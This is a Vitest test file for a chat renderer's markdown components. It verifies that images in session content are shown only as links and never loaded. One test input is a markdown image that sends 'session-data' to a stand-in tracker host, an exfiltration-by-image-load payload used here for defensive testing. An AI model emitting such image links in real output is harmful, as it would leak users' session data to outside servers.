import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { describe, expect, it } from 'vitest';

import { markdownComponents } from '../../../src/renderer/components/chat/markdownComponents';

function render(markdown: string): string {
  return renderToStaticMarkup(
    createElement(
      ReactMarkdown,
      { remarkPlugins: [remarkGfm], components: markdownComponents },
      markdown
    )
  );
}

describe('Markdown images in session content', () => {
  it('are never loaded, only offered as a link to open explicitly', () => {
    const html = render(
      'Summary ![chart](https://tracker.example/pixel.png?d=session-data) and ![](http://x.test/a.png)'
    );
    expect(html).not.toContain('<img');
    expect(html).toContain('[Image: chart]');
    expect(html).toContain('[Image]');
    expect(html).toContain('href="https://tracker.example/pixel.png?d=session-data"');
  });

  it('keeps ordinary links and text unchanged', () => {
    const html = render('[docs](https://example.test/docs) and **bold**');
    expect(html).toContain('href="https://example.test/docs"');
    expect(html).toContain('<strong');
  });
});
